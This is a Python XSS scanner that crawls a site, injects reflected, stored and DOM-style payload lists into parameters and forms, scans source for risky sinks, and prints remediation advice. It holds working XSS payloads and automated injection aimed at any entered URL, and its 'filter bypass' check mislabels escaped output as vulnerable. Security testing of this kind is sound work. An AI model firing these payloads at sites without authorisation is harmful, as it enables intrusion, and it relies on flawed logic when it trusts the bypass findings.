import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import re

# Payloads categorized by complexity
basic_xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "javascript:alert(1)"
]

dom_xss_payloads = [
    "#javascript:alert(1)",
    "#<img src=x onerror=alert(1)>",
    "javascript:alert(document.domain)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
]

advanced_xss_payloads = [
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<object data='javascript:alert(1)'>",
    "<embed src='javascript:alert(1)'>",
    "<math><maction actiontype='statusline#http://example.com' xlink:href='javascript:alert(1)'></maction></math>",
    "<?xml version='1.0'?><html xmlns='http://www.w3.org/1999/xhtml'><script>alert(1);</script></html>"
]

header_payloads = basic_xss_payloads[:3]  # Use simpler payloads for headers

HEADERS = {
    "User-Agent": "Mozilla/5.0 (XSS Scanner)",
    "Accept": "text/html,application/xhtml+xml",
    "Referer": "http://xss-scanner.example.com"
}

visited_urls = set()

class XSSScanner:
    def __init__(self):
        self.scan_results = []
        self.vulnerability_level = 0  # 0 = none, 1 = reflected, 2 = stored, 3 = DOM-based
        self.vulnerable_urls = []

    def log_result(self, message):
        self.scan_results.append(message)
        print(message)  # Also print to console for real-time monitoring

    def crawl(self, url, depth=2):
        if depth == 0 or url in visited_urls:
            return
        visited_urls.add(url)
        self.log_result(f"[*] Crawling: {url}")
        try:
            response = requests.get(url, headers=HEADERS, timeout=5)
            soup = BeautifulSoup(response.text, "html.parser")
            
            # Test the current page first
            self.test_xss(url)
            
            # Find and follow links
            for link in soup.find_all("a", href=True):
                next_url = urljoin(url, link["href"])
                if urlparse(next_url).netloc == urlparse(url).netloc:
                    self.crawl(next_url, depth - 1)
                    
            # Find and test forms
            for form in soup.find_all("form"):
                self.test_form(url, form)
                
        except requests.RequestException as e:
            self.log_result(f"[!] Error crawling {url}: {str(e)}")

    def test_form(self, base_url, form):
        try:
            action = form.get("action", "")
            method = form.get("method", "get").lower()
            form_url = urljoin(base_url, action)
            
            inputs = form.find_all("input")
            form_data = {}
            for input_tag in inputs:
                name = input_tag.get("name")
                if name:
                    form_data[name] = "XSS_TEST"
            
            if method == "get":
                self.test_xss(form_url, params=form_data)
            else:
                self.test_xss(form_url, data=form_data)
                
        except Exception as e:
            self.log_result(f"[!] Error testing form: {str(e)}")

    def test_xss(self, url, params=None, data=None):
        self.log_result(f"[*] Testing URL: {url}")
        
        # Test reflected XSS first
        if self.test_reflected_xss(url, params, data):
            return True
            
        # If no reflected XSS, test for potential stored XSS
        if self.test_stored_xss(url, params, data):
            return True
            
        return False

    def test_reflected_xss(self, url, params=None, data=None):
        # Test GET parameters
        if params is None:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            for param in query_params:
                for payload in basic_xss_payloads + advanced_xss_payloads:
                    modified_params = {k: (payload if k == param else v[0]) for k, v in query_params.items()}
                    if self.send_and_check_xss(url, modified_params, None, "GET", payload, "Reflected"):
                        self.vulnerability_level = max(self.vulnerability_level, 1)
                        return True
                        
        # Test POST data
        if data is not None:
            for payload in basic_xss_payloads + advanced_xss_payloads:
                modified_data = {k: (payload if i == 0 else v) for i, (k, v) in enumerate(data.items())}
                if self.send_and_check_xss(url, None, modified_data, "POST", payload, "Reflected"):
                    self.vulnerability_level = max(self.vulnerability_level, 1)
                    return True
                    
        return False

    def test_stored_xss(self, url, params=None, data=None):
        # This would require a way to verify the payload was stored
        # For a basic scanner, we'll just test if the payload appears in the response
        # A real scanner would need to navigate to other pages to check for persistence
        
        # Test with basic payloads first
        for payload in basic_xss_payloads:
            if params is not None:
                modified_params = {k: payload for k in params}
                if self.send_and_check_xss(url, modified_params, None, "GET", payload, "Potential Stored"):
                    self.vulnerability_level = max(self.vulnerability_level, 2)
                    return True
                    
            if data is not None:
                modified_data = {k: payload for k in data}
                if self.send_and_check_xss(url, None, modified_data, "POST", payload, "Potential Stored"):
                    self.vulnerability_level = max(self.vulnerability_level, 2)
                    return True
                    
        return False

    def test_dom_xss(self, url):
        # DOM-based XSS requires more sophisticated detection (often needing browser automation)
        # This is a simplified version that checks for common DOM XSS patterns in the source
        try:
            response = requests.get(url, headers=HEADERS, timeout=5)
            
            dom_xss_patterns = [
                r"document\.write\(.*\)",
                r"eval\(.*\)",
                r"innerHTML\s*=",
                r"location\.hash",
                r"window\.name",
                r"setTimeout\(.*\)",
                r"setInterval\(.*\)"
            ]
            
            for pattern in dom_xss_patterns:
                if re.search(pattern, response.text):
                    self.log_result(f"[DOM] Potential DOM XSS source detected at {url}: {pattern}")
                    self.vulnerability_level = max(self.vulnerability_level, 3)
                    return True
                    
        except requests.RequestException:
            pass
            
        return False

    def send_and_check_xss(self, url, params, data, method, payload, xss_type):
        try:
            if method == "GET":
                response = requests.get(url, params=params, headers=HEADERS, timeout=5)
            else:
                response = requests.post(url, data=data, headers=HEADERS, timeout=5)
                
            if payload in response.text:
                result = f"[{xss_type.upper()}] Potential XSS at {url} via {method} with payload: {payload}"
                self.log_result(result)
                self.vulnerable_urls.append((url, payload, xss_type))
                return True
                
            decoded_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
            if decoded_payload in response.text:
                result = f"[FILTER BYPASS] Potential XSS filter bypass at {url} via {method} with payload: {payload}"
                self.log_result(result)
                self.vulnerable_urls.append((url, payload, f"{xss_type} Filter Bypass"))
                return True
                
        except requests.RequestException as e:
            self.log_result(f"[!] Error testing {url}: {str(e)}")
            
        return False

    def get_remediation_advice(self):
        advice = "\n\n=== XSS SECURITY RECOMMENDATIONS ==="
        
        if self.vulnerability_level >= 1:
            advice += "\n\n[Reflected XSS Detected]"
            advice += "\n1. Implement proper output encoding for all user-supplied data"
            advice += "\n2. Use context-sensitive escaping (HTML, JavaScript, CSS, URL)"
            advice += "\n3. Validate all input against a whitelist of allowed characters"
            advice += "\n4. Implement Content Security Policy (CSP) headers"
        
        if self.vulnerability_level >= 2:
            advice += "\n\n[Stored XSS Detected]"
            advice += "\n1. All stored data should be properly sanitized before display"
            advice += "\n2. Implement rigorous input validation for all user-controllable data"
            advice += "\n3. Use secure libraries for rich text processing (like DOMPurify)"
            advice += "\n4. Regularly audit all data display points in the application"
        
        if self.vulnerability_level >= 3:
            advice += "\n\n[DOM-based XSS Detected]"
            advice += "\n1. Avoid using unsafe JavaScript methods like innerHTML, document.write()"
            advice += "\n2. Sanitize all data before passing to DOM manipulation functions"
            advice += "\n3. Be cautious with location.hash, window.name, and other client-side sources"
            advice += "\n4. Consider using safe alternatives like textContent instead of innerHTML"
        
        advice += "\n\nGeneral XSS Prevention Best Practices:"
        advice += "\n- Implement Content Security Policy (CSP) with strict directives"
        advice += "\n- Set HttpOnly and Secure flags on cookies"
        advice += "\n- Use X-XSS-Protection header (though this is being deprecated)"
        advice += "\n- Regularly update and patch all web application components"
        advice += "\n- Conduct regular security training for developers"
        advice += "\n- Perform periodic security audits and penetration tests"
        
        return advice

    def scan_application(self, base_url, depth=2):
        self.log_result(f"[*] Starting XSS scan on {base_url}")
        self.crawl(base_url, depth)
        
        for url in visited_urls:
            self.test_dom_xss(url)
        
        self.log_result("[*] Scan completed.")
        
        if self.vulnerability_level > 0:
            results = "\n".join(self.scan_results)
            results += "\n\n=== VULNERABILITY SUMMARY ==="
            for url, payload, vuln_type in self.vulnerable_urls:
                results += f"\n- {vuln_type} at {url} (Payload: {payload})"
            
            results += self.get_remediation_advice()
            return results
            
        return "\n".join(self.scan_results) + "\nNo XSS vulnerabilities detected."

def scan_for_xss(target, depth=2):
    scanner = XSSScanner()
    return scanner.scan_application(target, depth)

if __name__ == "__main__":
    target_url = input("Enter target URL to scan: ")
    print(scan_for_xss(target_url))